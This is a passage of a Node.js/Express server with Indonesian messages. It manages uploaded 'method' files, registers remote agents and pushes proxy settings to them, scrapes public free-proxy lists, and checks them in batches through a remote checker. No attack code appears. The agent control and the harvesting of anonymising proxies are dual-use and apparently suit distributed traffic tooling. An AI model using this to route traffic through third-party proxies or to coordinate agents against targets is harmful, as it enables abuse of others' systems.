            const stat = await fs.promises.stat(path.join(uploadDir, f));
            return { name: f, size: stat.size, mtime: stat.mtime };
          })
      );
      res.json(fileList);
    } catch {
      res.status(500).json({ error: 'Gagal membaca file' });
    }
  });
});

app.delete(
  '/api/method-files/:filename',
  disableIfAgent(),
  validateApiKey,
  validateFileName,
  async (req, res) => {
    const filename = req.params.filename;
    let filePath;
    try {
      filePath = getSafeFilePath(uploadDir, filename);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }
    if (!fs.existsSync(filePath))
      return res.status(404).json({ error: 'File tidak ditemukan' });

    try {
      fs.unlinkSync(filePath);
      logActivity('DELETE_METHOD_FILE', { file: filename });
      res.json({ message: 'File dihapus', file: filename });
    } catch (e) {
      logActivity('DELETE_FILE_FAIL', { file: filename, error: e.message });
      res.status(500).json({ error: 'Gagal menghapus file', detail: e.message });
    }
  }
);

app.get(
  '/api/method-files/download/:filename',
  disableIfAgent(),
  validateApiKey,
  validateFileName,
  (req, res) => {
    let filePath;
    try {
      filePath = getSafeFilePath(uploadDir, req.params.filename);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }
    if (!fs.existsSync(filePath))
      return res.status(404).json({ error: 'File tidak ditemukan' });

    res.download(filePath, (err) => {
      if (err) {
        logActivity('DOWNLOAD_METHOD_FILE_ERROR', {
          filename: req.params.filename,
          error: err.message
        });
        if (!res.headersSent)
          res.status(500).json({ error: 'Gagal download file' });
      }
    });
  }
);

app.post(
  '/api/method-files/rename',
  disableIfAgent(),
  validateApiKey,
  validateFileName,
  express.json(),
  (req, res) => {
    const { oldName, newName } = req.body;
    if (!oldName || !newName)
      return res
        .status(400)
        .json({ error: 'Parameter oldName dan newName diperlukan' });
    if (!isValidFileName(newName))
      return res.status(400).json({ error: 'Nama file baru tidak valid' });

    let oldPath;
    let newPath;
    try {
      oldPath = getSafeFilePath(uploadDir, oldName);
      newPath = getSafeFilePath(uploadDir, newName);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }
    if (!fs.existsSync(oldPath))
      return res.status(404).json({ error: 'File lama tidak ditemukan' });
    if (fs.existsSync(newPath))
      return res.status(409).json({ error: 'File dengan nama baru sudah ada' });

    try {
      fs.renameSync(oldPath, newPath);
      logActivity('RENAME_METHOD_FILE', { from: oldName, to: newName });
      res.json({
        message: 'Nama file berhasil diubah',
        from: oldName,
        to: newName
      });
    } catch (e) {
      logActivity('RENAME_FILE_FAIL', {
        from: oldName,
        to: newName,
        error: e.message
      });
      res.status(500).json({ error: 'Gagal rename file' });
    }
  }
);

app.get(
  '/api/method-files/view/:filename',
  disableIfAgent(),
  validateApiKey,
  validateFileName,
  (req, res) => {
    let filePath;
    try {
      filePath = getSafeFilePath(uploadDir, req.params.filename);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }
    if (!fs.existsSync(filePath))
      return res.status(404).json({ error: 'File tidak ditemukan' });

    try {
      const content = fs.readFileSync(filePath, 'utf8');
      res.type('text/plain').send(content);
    } catch {
      res.status(500).json({ error: 'Gagal membaca file' });
    }
  }
);

app.post(
  '/api/method-files/save/:filename',
  disableIfAgent(),
  validateApiKey,
  validateFileName,
  express.text({ type: '*/*', limit: '5mb' }),
  async (req, res) => {
    const filename = req.params.filename;
    let filePath;
    try {
      filePath = getSafeFilePath(uploadDir, filename);
    } catch (e) {
      return res.status(400).json({ error: e.message });
    }
    if (!fs.existsSync(filePath))
      return res.status(404).json({ error: 'File tidak ditemukan' });

    try {
      const normalized = String(req.body)
        .replace(/\r\n/g, '\n')
        .replace(/\0/g, '');
      if (Buffer.byteLength(normalized, 'utf8') > MAX_FILE_SIZE) {
        return res.status(400).json({ error: 'File terlalu besar' });
      }
      fs.writeFileSync(filePath, normalized, 'utf8');
      logActivity('EDIT_METHOD_FILE', { file: filename });
      res.json({ message: 'File berhasil disimpan', file: filename });
    } catch (e) {
      logActivity('EDIT_FILE_FAIL', { file: filename, error: e.message });
      res.status(500).json({ error: 'Gagal menyimpan file' });
    }
  }
);

/* =============================================================================
 * 21) AGENT ROUTES: CRUD, REGISTER, PROXY CONTROL
 * ========================================================================== */

app.get('/api/agents', disableIfAgent(), validateApiKey, (_req, res) => {
  loadAgents();
  res.json(AGENT_LIST);
});

app.get('/api/agents/summary', disableIfAgent(), validateApiKey, (_req, res) => {
  loadAgents();
  res.json({
    total: AGENT_LIST.length,
    active: AGENT_LIST.filter((a) => a.enabled !== false).length
  });
});

app.post(
  '/api/agents',
  disableIfAgent(),
  express.json(),
  validateApiKey,
  async (req, res) => {
    const { name, url, tags = [] } = req.body;
    if (!name || !url)
      return res.status(400).json({ error: 'Nama dan URL wajib diisi' });

    loadAgents();
    if (AGENT_LIST.some((a) => a.name === name))
      return res
        .status(400)
        .json({ error: 'Agent dengan nama ini sudah ada' });

    const newAgent = { name, url, enabled: true, tags };
    AGENT_LIST.push(newAgent);
    saveAgentsAndFlush();
    logActivity('AGENT_ADDED', newAgent);
    res.json({ message: 'Agent ditambahkan', agent: newAgent });
  }
);

app.put(
  '/api/agents/:name',
  disableIfAgent(),
  express.json(),
  validateApiKey,
  (req, res) => {
    const name = req.params.name;
    const { url, enabled, tags } = req.body;

    loadAgents();
    const idx = AGENT_LIST.findIndex((a) => a.name === name);
    if (idx === -1)
      return res.status(404).json({ error: 'Agent tidak ditemukan' });

    if (url) AGENT_LIST[idx].url = url;
    if (typeof enabled === 'boolean') AGENT_LIST[idx].enabled = enabled;
    if (Array.isArray(tags)) AGENT_LIST[idx].tags = tags;

    saveAgentsAndFlush();
    res.json({ message: 'Agent berhasil diperbarui' });
  }
);

app.delete(
  '/api/agents/:name',
  disableIfAgent(),
  validateApiKey,
  (req, res) => {
    const name = req.params.name;
    loadAgents();

    const idx = AGENT_LIST.findIndex((a) => a.name === name);
    if (idx === -1)
      return res.status(404).json({ error: 'Agent tidak ditemukan' });

    const removed = AGENT_LIST.splice(idx, 1)[0];
    saveAgentsAndFlush();
    logActivity('AGENT_DELETED', removed);
    res.json({ message: 'Agent dihapus', agent: removed });
  }
);

// Auto register agent
app.post('/api/agents/register', limiterAgentRegister, express.json(), async (req, res) => {
  if (NODE_TYPE !== 'master') return res.status(403).json({ error: 'Hanya master!' });

  let { name, url, publicUrl, tunnelUrl, agentKey, fingerprint } = req.body;

  if (!name || !fingerprint || agentKey !== AGENT_KEY) {
    return res.status(400).json({ error: 'Parameter salah atau API key tidak valid' });
  }
  if (!/^[a-f0-9]{64}$/i.test(fingerprint)) {
    return res.status(400).json({ error: 'Fingerprint tidak valid (harus 64 karakter hex)' });
  }

  const now = Date.now();
  if (!global.LAST_REGISTER_TIME) global.LAST_REGISTER_TIME = 0;
  if (now - global.LAST_REGISTER_TIME < 1000) {
    return res.status(429).json({ error: 'Terlalu sering register. Coba lagi nanti.' });
  }
  global.LAST_REGISTER_TIME = now;

  let finalUrl = url || tunnelUrl || null;
  if (publicUrl) {
    try {
      const resp = await fetch(`${publicUrl}/ping`, { timeout: 5000 }, { useProxy: false });
      if (resp.ok) {
        finalUrl = publicUrl;
      } else {
        if (tunnelUrl) finalUrl = tunnelUrl;
      }
    } catch {
      if (tunnelUrl) finalUrl = tunnelUrl;
    }
  }

  if (!finalUrl) {
    return res.status(400).json({ error: 'Tidak ada URL valid (public/tunnel)' });
  }

  loadAgents();
  const existing = AGENT_LIST.find((a) => a.fingerprint === fingerprint);

  if (existing) {
    if (existing.url !== finalUrl) {
      existing.url = finalUrl;
      logActivity('AGENT_URL_UPDATED', { name: existing.name, newUrl: finalUrl });
      saveAgentsAndFlush();
    }
    return res.json({ message: 'Sudah terdaftar', agent: existing });
  }

  const nameConflict = AGENT_LIST.find((a) => a.name === name);
  if (nameConflict) {
    return res.status(400).json({ error: `Nama agent "${name}" sudah dipakai oleh agent lain.` });
  }

  const newAgent = {
    name,
    url: finalUrl,
    fingerprint,
    enabled: true,
    auto: true,
    registeredAt: new Date().toISOString()
  };

  AGENT_LIST.push(newAgent);
  saveAgentsAndFlush();
  logActivity('AGENT_REGISTER_AUTO', newAgent);
  res.json({ message: 'Agent terdaftar', agent: newAgent });
});

// Push proxy config ke agent
async function pushProxyToAgent(agent, { mode = null, url = undefined } = {}) {
  try {
    if (mode) {
      const r = await axiosProxyAware(
        {
          method: 'post',
          url: `${agent.url}/api/proxy/toggle`,
          data: { key: AGENT_KEY, mode },
          timeout: 10000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: false }
      );
      return { agent: agent.name || agent.url, ok: true, res: r.data };
    }
    if (typeof url !== 'undefined') {
      const r = await axiosProxyAware(
        {
          method: 'post',
          url: `${agent.url}/api/proxy/config`,
          data: { key: AGENT_KEY, url },
          timeout: 10000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: false }
      );
      return { agent: agent.name || agent.url, ok: true, res: r.data };
    }
    return { agent: agent.name || agent.url, ok: false, error: 'no action' };
  } catch (e) {
    return {
      agent: agent.name || agent.url,
      ok: false,
      error: e.response?.data?.error || e.message || String(e)
    };
  }
}

// Multi-target agent proxy control
app.post('/api/agents/proxy', disableIfAgent(), validateApiKey, express.json(), async (req, res) => {
  const { agents, mode, url } = req.body || {};

  if ((!mode && typeof url === 'undefined') || !agents) {
    return res.status(400).json({ error: 'Harus ada agents[] dan mode/url' });
  }
  if (mode && !['on', 'off', 'toggle'].includes(mode)) {
    return res.status(400).json({ error: 'mode harus salah satu on|off/toggle' });
  }

  loadAgents();

  let targets = [];
  if (Array.isArray(agents)) {
    targets = AGENT_LIST.filter((a) => agents.includes(a.name));
  } else if (typeof agents === 'string') {
    const a = AGENT_LIST.find((x) => x.name === agents);
    if (a) targets = [a];
  }

  if (!targets.length)
    return res.status(404).json({ error: 'Agent target tidak ditemukan' });

  const results = await Promise.all(
    targets.map((agent) => pushProxyToAgent(agent, { mode: mode || null, url }))
  );

  const summary = {
    success: results.filter((r) => r.ok).map((r) => r.agent),
    failed: results
      .filter((r) => !r.ok)
      .map((r) => ({ agent: r.agent, error: r.error }))
  };

  res.json({ message: 'Perintah dikirim ke agent', summary, results });
});

// Single-target agent proxy control
app.post('/api/agents/:name/proxy', disableIfAgent(), validateApiKey, express.json(), async (req, res) => {
  const name = req.params.name;
  const { mode, url } = req.body || {};

  if (!mode && typeof url === 'undefined') {
    return res.status(400).json({ error: 'Harus ada mode/url' });
  }
  if (mode && !['on', 'off', 'toggle'].includes(mode)) {
    return res.status(400).json({ error: 'mode harus salah satu on|off/toggle' });
  }

  loadAgents();
  const agent = AGENT_LIST.find((a) => a.name === name);
  if (!agent) return res.status(404).json({ error: 'Agent tidak ditemukan' });

  const r = await pushProxyToAgent(agent, { mode: mode || null, url });

  if (!r.ok) {
    return res.status(502).json({ error: 'Agent gagal update proxy', detail: r });
  }

  res.json({ message: `Proxy agent ${name} berhasil diupdate`, result: r });
});

/* =============================================================================
 * 22) PROXY CHECKER REMOTE CONFIG ROUTES
 * ========================================================================== */

app.get(
  '/api/proxy-checker/health',
  limiterProxyChecker,
  disableIfAgent(),
  validateApiKey,
  async (_req, res) => {
    try {
      if (!PROXY_CHECKER_URL)
        return res
          .status(503)
          .json({ error: 'PROXY_CHECKER_URL belum terkonfigurasi' });
      const r = await axiosProxyAware(
        {
          method: 'get',
          url: `${PROXY_CHECKER_URL}/health`,
          timeout: 8000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      res.status(r.status).json(r.data);
    } catch (e) {
      res.status(502).json({ error: 'checker_unreachable', detail: e.message });
    }
  }
);

app.get(
  '/api/proxy-checker/metrics',
  limiterProxyChecker,
  disableIfAgent(),
  validateApiKey,
  async (_req, res) => {
    try {
      if (!PROXY_CHECKER_URL)
        return res
          .status(503)
          .json({ error: 'PROXY_CHECKER_URL belum terkonfigurasi' });
      const r = await axiosProxyAware(
        {
          method: 'get',
          url: `${PROXY_CHECKER_URL}/metrics`,
          timeout: 10000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      res.status(r.status).json(r.data);
    } catch (e) {
      res.status(502).json({ error: 'checker_unreachable', detail: e.message });
    }
  }
);

app.get(
  '/api/proxy-checker/config',
  limiterProxyChecker,
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  validateApiKey,
  async (_req, res) => {
    try {
      if (!PROXY_CHECKER_URL)
        return res
          .status(503)
          .json({ error: 'PROXY_CHECKER_URL belum terkonfigurasi' });
      const r = await axiosProxyAware(
        {
          method: 'get',
          url: `${PROXY_CHECKER_URL}/config`,
          timeout: 8000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      res.status(r.status).json(r.data);
    } catch (e) {
      res.status(502).json({ error: 'checker_unreachable', detail: e.message });
    }
  }
);

app.post(
  '/api/proxy-checker/config',
  limiterProxyChecker,
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  validateApiKey,
  async (req, res) => {
    try {
      if (!PROXY_CHECKER_URL)
        return res
          .status(503)
          .json({ error: 'PROXY_CHECKER_URL belum terkonfigurasi' });

      const allowKeys = new Set([
        'CONCURRENCY',
        'TCP_TIMEOUT',
        'HTTP_TIMEOUT',
        'FAST_MODE',
        'STRICT_MODE',
        'RETURN_TCP_ONLY',
        'MAX_BODY_BYTES',
        'INCLUDE_RESULTS',
        'DEBUG_MODE',
        'RETRIES',
        'CALLBACK_BATCH_SIZE',
        'MIN_VALID_BYTES',
        'MIN_TLS_VERSION',
        'DNS_TTL_MS',
        'IDLE_TIMEOUT_MS'
      ]);
      const updates = {};
      for (const [k, v] of Object.entries(req.body || {})) {
        if (allowKeys.has(k)) updates[k] = v;
      }
      if (!Object.keys(updates).length) {
        return res
          .status(400)
          .json({ error: 'Tidak ada field config yang valid untuk dikirim' });
      }

      const r = await axiosProxyAware(
        {
          method: 'post',
          url: `${PROXY_CHECKER_URL}/config`,
          data: updates,
          timeout: 10000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      res.status(r.status).json(r.data);
    } catch (e) {
      res.status(502).json({ error: 'checker_unreachable', detail: e.message });
    }
  }
);

app.post(
  '/api/proxy-checker/toggle',
  limiterProxyChecker,
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  validateApiKey,
  async (req, res) => {
    try {
      if (!PROXY_CHECKER_URL)
        return res
          .status(503)
          .json({ error: 'PROXY_CHECKER_URL belum terkonfigurasi' });
      const key = req.body?.key;
      if (!key) return res.status(400).json({ error: 'key diperlukan' });

      const r = await axiosProxyAware(
        {
          method: 'post',
          url: `${PROXY_CHECKER_URL}/config`,
          data: { [key]: 'toggle' },
          timeout: 8000,
          validateStatus: (s) => s >= 200 && s < 300
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
      res.status(r.status).json(r.data);
    } catch (e) {
      res.status(502).json({ error: 'checker_unreachable', detail: e.message });
    }
  }
);

app.post(
  '/api/proxy-checker/ping',
  limiterProxyChecker,
  disableIfAgent(),
  validateApiKey,
  async (_req, res) => {
    try {
      if (!PROXY_CHECKER_URL)
        return res
          .status(503)
          .json({ error: 'PROXY_CHECKER_URL belum terkonfigurasi' });
      let status = 'unknown';
      try {
        const h = await axiosProxyAware(
          {
            method: 'get',
            url: `${PROXY_CHECKER_URL}/health`,
            timeout: 5000,
            validateStatus: (s) => s >= 200 && s < 300
          },
          { useProxy: PROXY_RUNTIME.enabled }
        );
        status = h.status === 200 ? 'ok' : `http_${h.status}`;
      } catch {
        const root = await axiosProxyAware(
          {
            method: 'get',
            url: `${PROXY_CHECKER_URL}/`,
            timeout: 5000,
            validateStatus: () => true
          },
          { useProxy: PROXY_RUNTIME.enabled }
        );
        status = root.status ? `http_${root.status}` : 'no_response';
      }
      res.json({ status, url: PROXY_CHECKER_URL });
    } catch (e) {
      res.status(502).json({ status: 'down', error: e.message });
    }
  }
);

/* =============================================================================
 * 23) PROXY SCRAPE, CALLBACK, /proxy.txt
 * ========================================================================== */

// Proxy scrape sources
const SCRAPE_SOURCES = [
  {
    url:
      'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=4000&country=all&ssl=all&anonymity=all',
    proto: 'http'
  },
  {
    url:
      'https://raw.githubusercontent.com/vmheaven/VMHeaven-Free-Proxy-Updated/refs/heads/main/socks5.txt',
    proto: 'socks5'
  },
  {
    url:
      'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&ssl=all&anonymity=all',
    proto: 'socks4'
  },
  {
    url:
      'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/https/https.txt',
    proto: 'https'
  },
  {
    url:
      'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt',
    proto: 'socks5'
  },
  {
    url:
      'https://raw.githubusercontent.com/dpangestuw/Free-Proxy/refs/heads/main/socks5_proxies.txt',
    proto: 'socks5'
  },
  {
    url:
      'https://raw.githubusercontent.com/casa-ls/proxy-list/refs/heads/main/socks5',
    proto: 'socks5'
  },
  {
    url:
      'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks5/socks5.txt',
    proto: 'socks5'
  },
  {
    url:
      'https://raw.githubusercontent.com/Vann-Dev/proxy-list/refs/heads/main/proxies/socks4.txt',
    proto: 'socks4'
  },
  {
    url:
      'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks4/socks4.txt',
    proto: 'socks4'
  },
  {
    url:
      'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt',
    proto: 'socks4'
  },
  {
    url:
      'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    proto: 'socks4'
  },
  {
    url:
      'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    proto: 'socks5'
  }
];

function parseProxyLine(line) {
  const match = line
    .trim()
    .match(
      /^((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d):(\d{1,5})$/
    );
  if (!match) return null;
  if (!isValidPort(match[4])) return null;
  return match[0];
}

async function scrapeProxy({
  protocols = ['http', 'https', 'socks4', 'socks5'],
  country = 'ALL'
}) {
  const results = [];
  const stats = { total: 0, byProto: {} };

  const limit = pLimit(4);
  await Promise.all(
    SCRAPE_SOURCES.map((src) =>
      limit(async () => {
        if (!protocols.includes(src.proto) && src.proto !== 'mix') return;
        try {
          const { data } = await axiosProxyAware(
            {
              method: 'get',
              url: src.url,
              timeout: 30000
            },
            { useProxy: PROXY_RUNTIME.enabled }
          );

          const proxies = data
            .split('\n')
            .map((line) => parseProxyLine(line))
            .filter((p) => !!p);

          for (const p of proxies) results.push(p);
          stats.total += proxies.length;
          stats.byProto[src.proto] = (stats.byProto[src.proto] || 0) + proxies.length;
        } catch (err) {
          logActivity('SCRAPE_SOURCE_FAILED', {
            url: src.url,
            error: err.message
          });
        }
      })
    )
  );

  return { proxies: results, stats };
}

function sha1Of(arr) {
  const h = crypto.createHash('sha1');
  for (const s of arr) h.update(s + '\n');
  return h.digest('hex');
}

// Kirim proxy ke checker dalam batch (strict)
async function sendProxiesToCheckerInBatchesStrict({
  proxyFilePath,
  checkerUrl,
  callbackUrl,
  chunkSize = 200,
  retry = 2,
  waitForCheckerSummary = true,
  requestTimeoutMs = 20 * 60 * 1000,
  continueOnFail = false,
  allowPartialLastBatch = false,
  enforceFullBatch = true
} = {}) {
  if (!fs.existsSync(proxyFilePath))
    return { ok: false, error: 'proxy file not found' };
  if (!checkerUrl) return { ok: false, error: 'checkerUrl not configured' };

  chunkSize = Number(chunkSize) || 200;
  if (!Number.isInteger(chunkSize) || chunkSize <= 0) chunkSize = 200;

  const rawLines = fs
    .readFileSync(proxyFilePath, 'utf8')
    .split(/\r?\n/)
    .map((s) => s.trim())
    .filter(Boolean);

  const ipPortRegex =
    /^((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d):(\d{1,5})$/;
  const isValidIpPort = (line) => {
    const m = line.match(ipPortRegex);
    if (!m) return false;
    const port = Number(m[4]);
    return Number.isInteger(port) && port >= 1 && port <= 65535;
  };

  const seen = new Set();
  const all = [];
  for (const line0 of rawLines) {
    let line = line0
      .replace(/^[a-z]+:\/\//i, '')
      .replace(/^[^@]+@/, '')
      .trim();
    if (!isValidIpPort(line)) continue;
    if (seen.has(line)) continue;
    seen.add(line);
    all.push(line);
  }

  if (!all.length) {
    logActivity('PROXY_SEND_NONE_VALID', { rawLines: rawLines.length });
    return {
      ok: false,
      total: 0,
      error: 'no valid ip:port after normalization'
    };
  }

  logActivity('PROXY_SEND_PREPARED', { normalized: all.length, chunkSize });

  const batches = [];
  let buffer = [];
  for (const ipport of all) {
    buffer.push(ipport);
    if (buffer.length === chunkSize) {
      batches.push(buffer);
      buffer = [];
    }
  }
  if (buffer.length) batches.push(buffer);

  const results = {
    ok: true,
    total: all.length,
    batches: [],
    sentBatches: 0,
    successes: 0,
    errors: []
  };

  for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
    const chunk = batches[batchIndex];
    const batchHash = sha1Of(chunk);

    const isLast = batchIndex === batches.length - 1;
    const shouldBeFull =
      !(allowPartialLastBatch && isLast && chunk.length < chunkSize);
    if (shouldBeFull && enforceFullBatch && chunk.length !== chunkSize) {
      const msg = `batch ${batchIndex}: outbound size ${chunk.length} != chunkSize ${chunkSize}`;
      logActivity('PROXY_SEND_BATCHSIZE_MISMATCH', { batchIndex, msg });
      results.errors.push({ batchIndex, message: msg });
      if (!continueOnFail) break;
      else continue;
    }

    logActivity('PROXY_SEND_BATCH_PREPARE', {
      batchIndex,
      outbound: chunk.length,
      hash: batchHash
    });

    let attempt = 0;
    let sent = false;
    const batchInfo = {
      batchIndex,
      outbound: chunk.length,
      received: null,
      active: null,
      hash: batchHash,
      attempts: 0
    };
    results.batches.push(batchInfo);

    while (attempt <= retry && !sent) {
      attempt++;
      batchInfo.attempts = attempt;
      try {
        const payload = {
          proxies: chunk,
          callbackUrl,
          meta: { batchIndex, totalInBatch: chunk.length, hash: batchHash }
        };

        const resp = await axiosProxyAware(
          {
            method: 'post',
            url: checkerUrl,
            data: payload,
            timeout: requestTimeoutMs,
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            headers: { 'Content-Type': 'application/json' },
            validateStatus: (s) => s >= 200 && s < 300
          },
          { useProxy: PROXY_RUNTIME.enabled }
        );

        const receivedCount =
          typeof resp.data.receivedCount === 'number'
            ? resp.data.receivedCount
            : Array.isArray(resp.data.received)
            ? resp.data.received.length
            : null;
        const receivedHash =
          typeof resp.data.receivedHash === 'string'
            ? resp.data.receivedHash
            : null;

        if (receivedCount == null) {
          const msg = 'Checker missing receivedCount/received array';
          results.errors.push({ batchIndex, attempt, message: msg });
          const backoff = Math.min(30000, 2000 * attempt);
          logActivity('PROXY_SEND_MISSING_RECEIVED', {
            batchIndex,
            attempt,
            msg,
            backoff
          });
          await new Promise((r) => setTimeout(r, backoff));
          continue;
        }

        if (receivedHash && receivedHash !== batchHash) {
          const msg = `receivedHash mismatch (got=${receivedHash}, want=${batchHash})`;
          results.errors.push({ batchIndex, attempt, message: msg });
          const backoff = Math.min(30000, 2000 * attempt);
          logActivity('PROXY_SEND_HASH_MISMATCH', {
            batchIndex,
            attempt,
            msg,
            backoff
          });
          await new Promise((r) => setTimeout(r, backoff));
          continue;
        }

        batchInfo.received = receivedCount;

        if (receivedCount !== chunk.length) {
          const msg = `Mismatch received ${receivedCount} != outbound ${chunk.length}`;
          results.errors.push({ batchIndex, attempt, message: msg });
          logActivity('PROXY_SEND_MISMATCH', { batchIndex, msg });
          if (!continueOnFail) {
            sent = true;
            break;
          } else {
            sent = true;
          }
        } else {
          sent = true;
        }

        const activeCount = Array.isArray(resp.data.active)
          ? resp.data.active.length
          : typeof resp.data.activeCount === 'number'
          ? resp.data.activeCount
          : null;
        if (activeCount != null) {
          batchInfo.active = activeCount;
          results.successes += activeCount;
        }

        results.sentBatches += 1;
        if (waitForCheckerSummary && resp.data.summary) {
          logActivity('PROXY_CHECKER_SUMMARY', {
            batchIndex,
            summary: resp.data.summary
          });
        }
      } catch (e) {
        const msg = e.message || String(e);
        results.errors.push({ batchIndex, attempt, message: msg });
        const backoff = Math.min(30000, 2000 * attempt);
        logActivity('PROXY_SEND_EXCEPTION', {
          batchIndex,
          attempt,
          msg,
          backoff
        });
        await new Promise((r) => setTimeout(r, backoff));
      }
    }

    if (!sent) {
      const msg = `batch ${batchIndex} give up after ${retry} retries`;
      logActivity('PROXY_SEND_GIVEUP', { batchIndex, msg });
      results.errors.push({ batchIndex, message: msg });
      if (!continueOnFail) {
        logActivity('PROXY_SEND_STOPPING', { reason: 'giveup', batchIndex });
        break;
      }
    }
  }

  const mismatch = results.batches
    .filter((b) => b.received != null && b.received !== b.outbound)
    .map((b) => ({
      batchIndex: b.batchIndex,
      outbound: b.outbound,
      received: b.received,
      hash: b.hash
    }));
  if (mismatch.length) {
    logActivity('PROXY_SEND_MISMATCHES_SUMMARY', { mismatch });
  } else {
    logActivity('PROXY_SEND_ALL_MATCHED', {
      batches: results.batches.length
    });
  }

  return results;
}

// Scrape & kirim ke checker
app.get(
  '/api/scrape-proxies',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  validateApiKey,
  async (req, res) => {
    const protocols = (req.query.protocols || 'http,https,socks4,socks5')
      .split(',')
      .map((e) => e.trim().toLowerCase())
      .filter(Boolean);

    try {
      const { proxies, stats } = await scrapeProxy({
        protocols,
        country: req.query.country || 'ALL'
      });

      const rawPath = path.join(dataDir, 'raw_proxy.txt');
      if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
      fs.writeFileSync(rawPath, proxies.join('\n') + '\n', 'utf8');
      logActivity('PROXY_SCRAPE_RAW_SAVED', {
        total: proxies.length,
        path: rawPath
      });

      const CHECKER_URL = PROXY_CHECKER_URL;
      const callbackUrl = `${MASTER_URL}/proxy-callback?key=${apiKey}`;

      sendProxiesToCheckerInBatchesStrict({
        proxyFilePath: rawPath,
        checkerUrl: CHECKER_URL,
        callbackUrl,
        chunkSize: 200,
        retry: 2,
        waitForCheckerSummary: true,
        requestTimeoutMs: 20 * 60 * 1000,
        continueOnFail: false,
        allowPartialLastBatch: false,
        enforceFullBatch: true
      })
        .then((r) => {
          logActivity('PROXY_SENT_BATCHES_STRICT', r);
        })
        .catch((e) => {
          logActivity('PROXY_SEND_BATCH_ERR', { error: e.message });
        });

      res.json({
        message: 'Scrape proxy selesai, pengecekan batch sedang dikirim ke checker',
        total: stats.total,
        byProto: stats.byProto,
        example: proxies.slice(0, 5)
      });
    } catch (e) {
      logActivity('SCRAPE_PROXY_ERROR', { error: e.message });
      res.status(500).json({ error: e.message || String(e) });
    }
  }
);

// Callback dari checker
app.post(
  '/proxy-callback',
  limiterProxyCallback,
  validateApiKey,
  express.json({ limit: '50mb' }),
  (req, res) => {
    try {
      const { active } = req.body;
      if (!Array.isArray(active)) {
        return res.status(400).json({ error: 'Invalid payload: active must be array' });
      }

      const normalizeItem = (it) => {
        if (!it && it !== 0) return null;
        if (typeof it === 'string') return it.trim();
        if (typeof it === 'object') {
          if (typeof it.raw === 'string') return it.raw.trim();
          if (typeof it.host === 'string' && (it.port || it.port === 0))
            return `${it.host.trim()}:${String(it.port).trim()}`;
          if (typeof it.ip === 'string' && (it.port || it.port === 0))
            return `${it.ip.trim()}:${String(it.port).trim()}`;
          if (it.proxy && typeof it.proxy === 'string') return it.proxy.trim();
          try {
            const s = JSON.stringify(it);
            const m = s.match(
              /"?(host|ip)"?\s*:\s*"(.*?)".*?"?port"?\s*:\s*"?(\d+)"?/i
            );
            if (m) return `${m[2]}:${m[3]}`;
            return s;
          } catch {
            return null;
          }
        }
        return null;
      };

      const normalizedActive = active
        .map(normalizeItem)
        .filter(Boolean)
        .map((s) => s.replace(/\r?\n/g, '').trim());

      let existing = [];
      if (fs.existsSync(ACTIVE_PROXY_PATH)) {
        existing = fs
          .readFileSync(ACTIVE_PROXY_PATH, 'utf8')
          .split(/\r?\n/)
          .map((l) => l.trim())
          .filter(Boolean);
      }

      const combinedSet = new Set([...existing, ...normalizedActive]);
      const combined = Array.from(combinedSet);

      fs.writeFileSync(
        ACTIVE_PROXY_PATH,
        combined.join('\n') + (combined.length ? '\n' : ''),
        'utf8'
      );

      logActivity('PROXY_CALLBACK_SAVED_ACTIVE', {
        count: normalizedActive.length,
        total: combined.length,
        path: ACTIVE_PROXY_PATH
      });
      return res.json({
        status: 'ok',
        saved: normalizedActive.length,
        total: combined.length
      });
    } catch (err) {
      logActivity('PROXY_CALLBACK_ERROR', { error: err.message });
      return res.status(500).json({ error: err.message });
    }
  }
);

// /proxy.txt
app.get('/proxy.txt', (_req, res) => {
  const proxyPath = path.join(__dirname, 'proxy.txt');
  if (!fs.existsSync(proxyPath))
    return res.status(404).json({ error: 'proxy.txt not found' });
  res.type('text/plain').send(fs.readFileSync(proxyPath, 'utf8'));
});

/* =============================================================================
 * 24) TOOLS & DIAGNOSTICS ROUTES (HEALTH, METRICS, HOSTCHECK, FINGERPRINT)
 * ========================================================================== */

app.get('/api/health', (_req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    cpu: os.loadavg()[0],
    memory: Math.round(process.memoryUsage().rss / 1024 / 1024),
    totalMemory: Math.round(os.totalmem() / 1024 / 1024),
    hostname: os.hostname()
  });
});

app.get('/readyz', (_req, res) => {
  const ready = Boolean(supabase && apiKey && COOKIE_SECRET);
  if (!ready) return res.status(503).json({ status: 'not_ready' });
